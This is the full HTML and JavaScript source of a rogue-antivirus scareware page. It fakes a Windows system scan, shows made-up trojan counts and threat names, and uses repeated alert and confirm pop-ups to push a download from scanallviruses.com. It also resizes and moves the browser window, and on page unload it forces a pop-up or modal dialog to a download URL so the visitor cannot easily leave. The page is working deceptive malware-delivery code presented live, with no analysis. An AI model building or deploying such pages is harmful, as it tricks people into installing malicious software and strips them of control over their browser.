
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Scanning page</title>
<!-- base href="http://91.211.64.111/f/" -->
<script type="text/javascript" src="img/jquery.js"></script>
<script type="text/javascript" src="img/jquery-init.js"></script>
<script type="text/javascript" src="img/flist.js"></script>
<script>
var prcnt_interval;
var scan_speed=15;
var iteration=0;


var Drag = {
	obj : null,
	init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
	{
		o.onmousedown	= Drag.start;

		o.hmode			= bSwapHorzRef ? false : true ;
		o.vmode			= bSwapVertRef ? false : true ;

		o.root = oRoot && oRoot != null ? oRoot : o ;

		if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
		if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
		if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
		if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

		o.minX	= typeof minX != 'undefined' ? minX : null;
		o.minY	= typeof minY != 'undefined' ? minY : null;
		o.maxX	= typeof maxX != 'undefined' ? maxX : null;
		o.maxY	= typeof maxY != 'undefined' ? maxY : null;

		o.xMapper = fXMapper ? fXMapper : null;
		o.yMapper = fYMapper ? fYMapper : null;

		o.root.onDragStart	= new Function();
		o.root.onDragEnd	= new Function();
		o.root.onDrag		= new Function();
	},

	start : function(e)
	{
		var o = Drag.obj = this;
		e = Drag.fixE(e);
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		o.root.onDragStart(x, y);

		o.lastMouseX	= e.clientX;
		o.lastMouseY	= e.clientY;

		if (o.hmode) {
			if (o.minX != null)	o.minMouseX	= e.clientX - x + o.minX;
			if (o.maxX != null)	o.maxMouseX	= o.minMouseX + o.maxX - o.minX;
		} else {
			if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
			if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
		}

		if (o.vmode) {
			if (o.minY != null)	o.minMouseY	= e.clientY - y + o.minY;
			if (o.maxY != null)	o.maxMouseY	= o.minMouseY + o.maxY - o.minY;
		} else {
			if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
			if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
		}

		document.onmousemove	= Drag.drag;
		document.onmouseup		= Drag.end;

		return false;
	},

	drag : function(e)
	{
		e = Drag.fixE(e);
		var o = Drag.obj;

		var ey	= e.clientY;
		var ex	= e.clientX;
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		var nx, ny;

		if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
		if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
		if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
		if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

		nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
		ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

		if (o.xMapper)		nx = o.xMapper(y)
		else if (o.yMapper)	ny = o.yMapper(x)

		Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
		Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
		Drag.obj.lastMouseX	= ex;
		Drag.obj.lastMouseY	= ey;

		Drag.obj.root.onDrag(nx, ny);
		return false;
	},

	end : function()
	{
		document.onmousemove = null;
		document.onmouseup   = null;
		Drag.obj.root.onDragEnd(	parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
									parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
		Drag.obj = null;
	},

	fixE : function(e)
	{
		if (typeof e == 'undefined') e = window.event;
		if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
		if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
		return e;
	}
};

function hideWarnDialog()
{
	if(confirm('Dont close this window if your want you PC to be clean.'))	{
		crptr3455345345();
	}
	else	{
		nberfjhjdf();
	};
};
function nberfjhjdf(){
	alert("Harmful and malicious software detected. These programs may damage your computer and steal your private information. Online Security Scanner requires  AntiVirus Protection components to repair your computer. Please click OK to download and install AntiVirus Protection components.");
	crptr3455345345();
}
function crptr3455345345alt(){
	//showOverLay();
	//onopenUpdate(null);
	crptr3455345345();
	
	return false;
};




function update()
{
	
 if ($(".progress_bar_fill").width()>0)
 {
 	
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#cur_file_scan").html(flist[Math.floor(Math.random()*flist.length)] );
  
  if ($(".progress_bar_fill").width()<350 && iteration==0)
  {
  // $("#threat1").toggleClass("block");
   document.getElementById('threat1').style.visibility = 'visible';
   //$("#desc").toggleClass("block");
   document.getElementById('desc').style.visibility = 'visible';
   //$("#alert_img").attr("src","img/alert.gif");
   
   setInterval("$('#tc1').toggleClass('none')",1000);
   iteration=1;
  }
  if ($(".progress_bar_fill").width()<200 && iteration==1)
  {
   //$("#threat2").toggleClass("block");
   document.getElementById('threat2').style.visibility = 'visible';
   setInterval("$('#tc2').toggleClass('none')",1000);
   iteration=2;
  }
  if ($(".progress_bar_fill").width()<100 && iteration==2)
  {
   //$("#threat3").toggleClass("block");
   document.getElementById('threat3').style.visibility = 'visible';
   setInterval("$('#tc3').toggleClass('none')",1000);
   setInterval("$('#tc4').toggleClass('none')",1000);
   iteration=3;
  }  
 }
 else
 {
  clearInterval(prcnt_interval);
  $(".file_scanner").html("Scan complete. 527 vulnerabilities was found!");
  setTimeout("pop2()",1000);
 }
}

function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}

function Maximize() 
{
window.moveTo(0,0);
window.resizeTo(screen.width,screen.height);
}

function download() {
 window.location='http://scanallviruses.com/inst.php?tid=ad79&aid=1';
}

function away()
{
	w = window;
	ua = navigator.userAgent;
	v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
  	x = 11;
  	eval('w.resizeTo(x*10,x*11-7)');
	w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}

function pop1() {

confirm('Warning!!! '+
'Your computer contains various signs of viruses and malware programs presence.\n\n'+
'Your system requires immediate anti viruses check! '+
'AntiVirus Protection will perform a quick and free scanning of your PC for viruses and malicious programs.');
}

function pop2() {
confirm('Your computer remains infected by threats! '+
'They can cause data loss and file damages and need to be cured as soon as possible.\n\n'+
'Return to AntiVirus Protection and download it secure to your PC');

pop4();
}

function pop3() {
alert('Your computer remains infected by threats! '+
'They can cause data loss and file damages and need to be cured as soon as possible.\n\n'+
'Return to AntiVirus Protection and download it secure to your PC');
}

function pop4() {
  document.getElementById('alert').style.display = 'block';
  $("#alert").css('top', $(window).height()/2- $("#alert").height()/2); 
  $("#alert").css('left', $(window).width()/2- $("#alert").width()/2);
  $("#alert").show();  
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}

function sp2init(){
}


function loading() {

  if (window.attachEvent)
    away();
  pop1();
  Maximize();
  window.focus(); 
}

function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","block");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  //setInterval("window.focus()",1000);
  
	$(".progress_bar_fill").animate({width:"0px"},scan_speed*1000);
	
	
	
	prcnt_interval = setInterval(update,scan_speed*10);	
};

loading();

//--------------------------------------------------------------------------------
var exit = true;
var usePopDialog = true;
var nid=0;
var tid=431;
var mid=947;
var full=1;
var popDialogOptions = "dialogWidth:1024px; dialogHeight:768px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
var popWindowOptions = " scrollbars=1,menubar=1,toolbar=1,location=1,personalbar=1,status=1,resizable=1";
var clid = "7f09c9e1c55f7d63f02909a14c1a45e0";
var usePopDialog = true;
var isUsingSpecial = false;
dat=new Date(1245977889);
var dlth=dat.getHours()-dat.getUTCHours();
newurl = "/download.php?nu=&dlth="+dlth;
var isXPSP2 = false;
var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
function ext(){
       if(exit)       {
               exit=false;
               nberfjhjdf();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(popURL,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
               }else{
                         iie.launchURL(popURL);
               }
        }
}

var popURL = newurl;
isUsingSpecial = true;
if (window.attachEvent)
 eval("window.attachEvent('onunload',ext);");
else
 window.addEventListener("unload", ext, false);
 
//--------------------------------------------------------------------------------




</script>
<style type="text/css">
<!--
body {
	padding:0px;
	margin:0px;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:11px;
	background-color:#FFFFFF;
	color:#000000;
	height:100%;
}
-->

.left_bar {
	position: absolute;	
	background-color:#718de0;
	color:#3333CC;
	height:100%;
}
.left_header {
	background-image:url(img/box_top_.gif);
	background-repeat:no-repeat;
	width:213px;
	height:19px;
	padding:7px 0 0 13px;
	margin:12px 0 0 12px;
	font-weight:bold;
	color:#3F3D3D;	
}

.left_box {
	background-color:#d7def8;
	color:#3F3D3D;
	border-left:1px solid #FFFFFF;
	border-right:1px solid #FFFFFF;
	border-bottom:1px solid #FFFFFF;
	width:211px;
	margin:0 0 0 12px;
	padding:10px 0 6px 0;
}

.left_box_line {
	padding:2px 2px 3px 15px;
}

.left_box_line a{
	color:#38599c;
	background-color:inherit;
	text-decoration:none;
}
.left_box_line a:hover{
	text-decoration:underline;
}
.left_bar_icon {
	vertical-align:middle;
	padding-right:4px;
}

.right_bar {
	position:absolute;
	left:238px;
}

.right_hr {
	background-image:url(img/hrline.gif);
	background-repeat:no-repeat;
	width:280px;
	height:19px;
	padding-left:15px;
	padding-bottom:15px;
	margin-top:15px;	
	font-weight:bold;
}

.folder_box {
	display:inline;
	margin:20px 0 0 0;
	padding-left:20px;
	width:170px;
}

.folder_icon {
	vertical-align:middle;
	padding:0 10px 0 0;
}

.progress_bar {
	margin:15px 15px 0 15px;
}
.progress_bar_bg {
	background-image:url(img/progressbar.gif);
	background-repeat:no-repeat;
	width:416px;
	height:15px;
	padding:1px 3px 1px 3px;
	margin:7px 0 0 0;
}

.progress_bar_progress {
	background-image:url(img/progressbar_green.gif);
	background-position:left;
	background-repeat:repeat-x;
	height:15px;
	width:416px;
}

.progress_bar_fill {
	float:right;
	background-color:white;
	width:418px;
	height:15px;
}

#progress_prcnt {
	position:absolute;
	padding-left:200px;
}

.file_scanner {
	font-weight:bold;
	margin:5px 15px 0 15px; 
}

.window1 {
	width:700px;
	height:337px;
	background-image:url(img/window1.gif);
	background-repeat:no-repeat;
	margin:5px 15px 0 15px; 	
}

.td_cell1 {
	padding-top:10px;
	padding-left:7px;
}

.td_cell2 {
	padding-top:7px;
	padding-left:7px;
}

.none {
	visibility:hidden;
}

.trojan {
	position:absolute;
	display:inline;
	padding-left:50px;
	padding-top:30px;
}

.trojan_caption {
	font-weight:bold;
	color:red;
	padding-left:5px;
}

.white_div {
	Z-INDEX: 1200;
	position:absolute;
	background-color:white;
	width:100%;
	height:100%;
}

#alert {
	Z-INDEX: 1300;
	width:434px;
	height:332px;
	display:none;
	position:absolute;
	cursor:pointer;
	cursor:hand;
}
</style></head><body onload="loaded()">
<bgsound src="#" id="soundeffect" hidden="true" loop="1" autostart="false">




<DIV id=alert style="LEFT: 0px; z-index:2; WIDTH: 100%; POSITION: absolute; TOP: 190px; display: none;" align=center>
<DIV style="cursor:hand; WIDTH: 434px; height:332px; POSITION: relative; background-image:url(img/alert.gif); background-color:white;"><input type='button' style='POSITION: relative; width:21px; height:21px; left:200px; top:5px; border-width:0px; background-image:url(closebutton.gif)' onclick='hideWarnDialog();'><spacer width='446' height='294' /></DIV>
</div>





<div style="display: none;" id="white" class="white_div" align="center">
	<div style="position: relative; top: 50%;"><img src="img/page_progressbar.gif" width="51" height="19">
    </div>
   </div>
<div style="display: block;" class="left_bar">
  <div class="left_header">
    	System Tasks
  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/i5000000.gif" class="left_bar_icon" width="14" height="16"><a href="#">View system information</a>	    </div>
	  <div class="left_box_line">
    	<img src="img/i6000000.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Add or remove programs</a>	  </div>
	  <div class="left_box_line">
   	    <img src="img/i7000000.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Change a settings</a>      </div>
  </div>
	<div class="left_header">
		Other Places
  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/i1000000.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Network Places</a>		</div>
	  <div class="left_box_line">
    	<img src="img/i2000000.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/i3000000.gif" class="left_bar_icon" width="16" height="14"> <a href="#">Shared Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/i4000000.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Control Panel</a>      </div>
  </div>
	<div class="left_header">
		Details
  </div>
	<div class="left_box">
	  <div class="left_box_line">
	    	<strong>My Computer</strong><br>
		  System Folder
      </div>
	</div>
</div>

<div class="right_bar">
  <div class="right_hr">
    	System scan progress
  </div>
	<div class="folder_box">
   	  <div id="tc1" class="trojan none">
        	<img src="img/inf20000.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">7 trojans</span>
      </div>

    	<img src="img/folder.gif" class="folder_icon" width="43" height="40">Shared Documents
  </div>
  <div class="folder_box">
    	<div id="tc2" class="trojan none">
        	<img src="img/inf20000.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">103 trojans</span>
        </div>
    
    	<img src="img/folder.gif" class="folder_icon" width="43" height="40">My Documents
  </div>
  <div class="right_hr">
    	Hard drives
  </div>
	<div class="folder_box">
    	<div id="tc3" class="trojan none">
        	<img src="img/inf20000.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">362 trojans</span>
        </div>
    
    	<img src="img/hdd.gif" class="folder_icon" width="43" height="40">Local Disk (C:)
  </div>
  <div class="folder_box">
    	<div id="tc4" class="trojan none">
        	<img src="img/inf20000.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">155 trojans</span>
        </div>
    
    	<img src="img/hdd.gif" class="folder_icon" width="43" height="40">Local Disk (D:)
  </div>
  <div class="right_hr">
    	DVD
  </div>
	<div class="folder_box">
    	<img src="img/dvd.gif" class="folder_icon" width="43" height="40">DVD-RAM Drive (E:)
  </div>
  <div class="progress_bar">
	<div class="progress_bar_bg">
	  <div class="progress_bar_progress">
       	<div style=" display: block;" class="progress_bar_fill">
        </div>
            	<div id="progress_prcnt">100%</div>                      
      </div>          
		</div>
	</div>
    <div class="file_scanner">Now scanning: <span id="cur_file_scan"></span></div>
	<div class="window1">
   	  <div style="font-size: 15px; font-weight: bold; color: white; padding-top: 14px; padding-left: 35px;">
        	Your Computer is Infected!
      </div>
    	<div style="padding-top: 22px;">
        	Threats and actions:
      </div>   
        <table border="0">
          <tbody><tr>
            <td width="166" class="td_cell1">Name</td>
            <td class="td_cell1" width="105">Risk level</td>
            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="" id="threat1" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/qicon.gif" style="padding-right: 5px;" align="absmiddle">  <b>Email-Worm.Win32.Net</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat2" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/qicon.gif" style="padding-right: 5px;" align="absmiddle">  <b>Email-Worm.Win32.Myd</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat3" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/qicon.gif" style="padding-right: 5px;" align="absmiddle">  <b>Trojan-Downloader.Win</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </tbody></table>

        <div style=" visibility:hidden; padding-top: 12px; padding-left: 12px; width: 600px;" class="" id="desc">
            <b>Description:</b><br>
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br><br>
            <b>Advice:</b><br>
            You need to remove this threat as soon as possible!
      </div>
        <div style="padding-top: 50px; padding-left: 590px;"><a href="http://scanallviruses.com/inst.php?tid=ad79&aid=1">Full system cleanup</a></div>
  </div>
</div>
<script>Drag.init(document.getElementById('alert'));</script>
</body></html>